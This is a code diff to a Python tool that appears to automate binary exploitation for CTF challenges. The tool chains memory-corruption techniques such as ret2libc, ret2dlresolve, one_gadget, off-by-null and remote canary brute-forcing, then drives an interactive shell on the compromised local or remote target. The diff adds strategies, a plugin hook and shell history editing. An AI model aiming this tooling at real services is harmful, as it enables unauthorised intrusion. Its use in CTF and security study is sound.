@@ -7,10 +7,10 @@ import struct
 import sys
 import time
 
-from . import color, i18n
+from . import color, histedit, i18n
 from .aco import AntColony
 from .debugger import Process
-from .exploits import ExploitContext, ALL_STRATEGIES, cyclic, cyclic_find, p64
+from .exploits import ExploitContext, all_strategies, cyclic, cyclic_find, p64
 from .gadgets import GadgetFinder
 
 
@@ -33,6 +33,16 @@ STATE_ORDER = [State.RECON, State.DECOMPILE, State.SCAN, State.STRATEGY,
 # common CTF flag shapes: flag{...}, CTF{...}, HTB{...}, picoCTF{...}, ...
 FLAG_RE = re.compile(r"[A-Za-z0-9_]{2,32}\{[^\n{}]{1,200}\}")
 
+# plugin registry: extra capability-DAG edges from the outside
+_EDGE_PLUGINS = []
+
+
+def register_technique(fn):
+    """register fn(ctx) -> [Technique] to extend the capability DAG"""
+    if fn not in _EDGE_PLUGINS:
+        _EDGE_PLUGINS.append(fn)
+    return fn
+
 
 class Logger:
     def __init__(self, verbose=True):
@@ -53,10 +63,13 @@ class Logger:
 
 
 class FSM:
-    def __init__(self, path, log=None, lang="zh", remote=None, keep_shell=False):
+    def __init__(self, path, log=None, lang="zh", remote=None, keep_shell=False,
+                 use_pheromone=True, libc_path=None):
         i18n.set_lang(lang)
         self.path = path
         self.remote = remote        # (host, port) when attacking a remote service
+        self.use_pheromone = use_pheromone
+        self.libc_path = libc_path
         self.keep_shell = keep_shell  # leave the shell open for interactive use
         self.log = log or Logger()
         self.state = State.RECON
@@ -144,13 +157,16 @@ class FSM:
         gadgets = GadgetFinder(self.elf)
         ctx = ExploitContext(self.elf, self.scanner, gadgets, self.log)
         ctx.remote = self.remote
+        ctx.libc_path = self.libc_path
         self.ctx = ctx
 
         from .graph import Colony
-        colony = Colony(self.build_edges(ctx), self.log)
+        colony = Colony(self.build_edges(ctx), self.log, enabled=self.use_pheromone)
         trail, ok = colony.solve(ctx)
         self.report_data["strategies"] = [e.name for e, _ in (trail or [])]
         self.report_data["aco"] = colony.history if hasattr(colony, "history") else []
+        self.report_data["pheromone"] = colony.edge_report(ctx)
+        self.report_data["pheromone_enabled"] = self.use_pheromone
         if ok:
             self.state = State.VERIFY
             self.transition("verify", True)
@@ -162,11 +178,13 @@ class FSM:
 
         # ---- legacy linear fallback (safety net) ----
         tried = []
-        strategies = [S(ctx) for S in ALL_STRATEGIES]
+        strategies = [S(ctx) for S in all_strategies()]
         candidates = [s for s in strategies if s.feasible()]
         # order: specific before generic
         prio = {"fmt": 0, "heap": 1, "ret2text": 2, "pivot": 3, "srop": 4,
-                "ret2libc": 5, "ret2syscall": 6, "shellcode": 7}
+                "ret2libc": 5, "one_gadget": 5, "ret2csu": 6, "ret2dlresolve": 6,
+                "ret2syscall": 6, "shellcode": 7, "canary_brute": 8,
+                "offbynull": 9}
         candidates.sort(key=lambda s: prio.get(s.name, 9))
         self.log.log(State.STRATEGY,
                      f"feasible strategies: {[s.name for s in candidates] or 'none'}",
@@ -282,25 +300,28 @@ class FSM:
         where = f"{self.remote[0]}:{self.remote[1]}" if self.remote else self.path
         print(color.section(f"\n== interactive shell @ {where} =="))
         print(color.dim("send commands line by line, 'exit'/'quit' or Ctrl-D to leave\n"))
-        while True:
-            if sys.stdin is not None and getattr(sys.stdin, "isatty", lambda: False)():
-                print(color.section("shell> "), end="", flush=True)
-            line = sys.stdin.readline()
-            if not line:
-                break
-            cmd = line.rstrip("\n")
-            if cmd.strip() in ("exit", "quit"):
-                break
-            try:
-                tube.sendline(cmd)
-            except (BrokenPipeError, OSError):
-                print(color.err("shell is gone"))
-                break
-            time.sleep(0.1)
-            out = tube.recv(0.5)
-            if out:
-                sys.stdout.write(out.decode("utf-8", "replace"))
-                sys.stdout.flush()
+        histedit.setup()
+        prompt = "shell> " if (sys.stdin is not None and getattr(sys.stdin, "isatty", lambda: False)()) else ""
+        try:
+            while True:
+                line = histedit.read_line(prompt)
+                if not line:
+                    break
+                cmd = line.rstrip("\n")
+                if cmd.strip() in ("exit", "quit"):
+                    break
+                try:
+                    tube.sendline(cmd)
+                except (BrokenPipeError, OSError):
+                    print(color.err("shell is gone"))
+                    break
+                time.sleep(0.1)
+                out = tube.recv(0.5)
+                if out:
+                    sys.stdout.write(out.decode("utf-8", "replace"))
+                    sys.stdout.flush()
+        finally:
+            histedit.save()
         tube.close()
 
     # ------------------------------------------------------------------
@@ -372,7 +393,9 @@ class FSM:
         """wire the capability DAG: techniques are edges, strategies become
         single-shot or staged edge executors"""
         from .exploits import (Ret2Text, Ret2Libc, Ret2Syscall, FmtGOT,
-                               Shellcode, SROP, StackPivot, HeapUAF)
+                               Shellcode, SROP, StackPivot, HeapUAF,
+                               Ret2OneGadget, Ret2CsuOneGadget, Ret2Dlresolve,
+                               CanaryBrute, OffByNull)
         from .graph import (Technique, CAP_RIP, CAP_LIBC, CAP_FMTK,
                             CAP_HEAP, CAP_SHELL, SESSION, PROCESS)
         fsm = self
@@ -443,7 +466,7 @@ class FSM:
         def _relro_open(c):
             return c.elf.relro != "full"
 
-        return [
+        edges = [
             Technique("dt-offset", [], [CAP_RIP], t_offset,
                       feasible=lambda c: "bof" in c.vuln_kinds, scope=SESSION,
                       prio=0, zh="崩溃取证推断偏移 (ACO 兜底)",
@@ -512,7 +535,39 @@ class FSM:
                       feasible=lambda c, _f=Shellcode(ctx).feasible: _f(), prio=7,
                       zh="可执行栈注入 shellcode",
                       en="inject shellcode on the exec stack"),
+            Technique("one_gadget", [CAP_RIP], [CAP_SHELL],
+                      lambda c, _s=Ret2OneGadget(ctx): _s.run(),
+                      feasible=lambda c, _s=Ret2OneGadget(ctx): _s.feasible(),
+                      prio=8, zh="泄露 libc 后跳 one_gadget",
+                      en="leak libc, jump to a one_gadget"),
+            Technique("ret2csu", [CAP_RIP], [CAP_SHELL],
+                      lambda c, _s=Ret2CsuOneGadget(ctx): _s.run(),
+                      feasible=lambda c, _s=Ret2CsuOneGadget(ctx): _s.feasible(),
+                      prio=8, zh="__libc_csu_init 链泄露 + one_gadget",
+                      en="csu-based leak + one_gadget"),
+            Technique("dlresolve", [CAP_RIP], [CAP_SHELL],
+                      lambda c, _s=Ret2Dlresolve(ctx): _s.run(),
+                      feasible=lambda c, _s=Ret2Dlresolve(ctx): _s.feasible(),
+                      prio=8, zh="ret2dlresolve 解析 system",
+                      en="ret2dlresolve resolves system"),
+            Technique("offbynull", [], [CAP_SHELL],
+                      lambda c, _s=OffByNull(ctx): _s.run(),
+                      feasible=lambda c, _s=OffByNull(ctx): _s.feasible(),
+                      prio=9, zh="off-by-null 栈重叠跳后门",
+                      en="off-by-null stack overlap to the win function"),
+            Technique("canary-brute", [], [CAP_SHELL],
+                      lambda c, _s=CanaryBrute(ctx): _s.run(),
+                      feasible=lambda c, _s=CanaryBrute(ctx): _s.feasible(),
+                      prio=9, zh="远程 fork 服务逐字节爆破 canary",
+                      en="byte-wise canary brute on a fork server"),
         ]
+        for fn in _EDGE_PLUGINS:
+            try:
+                extra = fn(ctx) or []
+                edges = edges + list(extra)
+            except Exception:
+                continue
+        return edges
 
     # ------------------------------------------------------------------
     def _explain_no_strategy(self):
@@ -643,7 +698,7 @@ class FSM:
         from .disasm import Disasm
         # rank functions: overflow-function first, then everything else
         bof = self.ctx.bof_finding() if self.ctx else None
-        funcs = sorted(self.elf.functions(), key=lambda s: 0 if (bof and s.name == bof.func) else 1)
+        funcs = sorted(self.elf.code_symbols(), key=lambda s: 0 if (bof and s.name == bof.func) else 1)
         for sym in funcs:
             if not sym.value or (sym.size == 0 and sym.name != (bof.func if bof else "")):
                 continue
